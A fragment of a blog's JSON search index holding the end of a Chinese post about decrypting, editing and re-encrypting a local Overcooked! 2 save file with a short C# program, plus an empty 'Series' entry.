CRC32.Append(ref final_data); 186 File.WriteAllBytes(outputfile, final_data); 187 } 188 } 189 } 190} 写好代码后可以尝试管不管用，我用只有 5 颗星的存档 03 做测试。存档 03 这五颗星分别是来自王座室的三颗星和关卡 1-1 的两颗星，其中关卡 1-1 的历史最高得分是 136。\n下面是存放存档的文件夹。不难猜测，CoopSlot_SaveFile_2.save 是我要修改的存档。\n下面两张图依次是解密后格式化前与格式化后的存档文件。如我的猜测，解密后的存档文件果真是 .json 格式：\n看起来还是很奇怪。似乎需要把所有的反斜线都去掉，并且把上下花括号外的引号都去掉才像是正常的 .json 文件。\n确实，现在参数名称和参数值一一对应。除了 NGPEnabled，其他参数都很好理解。那我现在就要把关卡 1-1（LevelID 为 1）的最高分数设为 514，并且三星通关。现在加密并把它重新塞进游戏，看看效果如何。\n特别需要注意的是，最开始我使用 .NET 8.0 运行这个程序，但是在解密时并不能成功；而相同的代码在 .NET 3.1（原程序使用了 .NET 3.5）可以完美运行，不过程序中使用的 Crc32 类（出现于 .NET 6.0）在 .NET 3.1 中不受支持，于是只好再将 Crc32 类的定义代码抄过来。\n","link":"https://jackgdn.github.io/post/%E4%B8%80%E5%B0%8F%E4%BC%99%E8%A7%89%E5%BE%97-overcooked-2-%E5%A4%AA%E9%9A%BE%E4%BA%8E%E6%98%AF%E4%BB%96/","section":"post","tags":["C#","Reverse"],"title":"修改 Overcooked! 2 存档"},{"body":"","link":"https://jackgdn.github.io/series/","section":"series","tags":null,"title":"Series"}]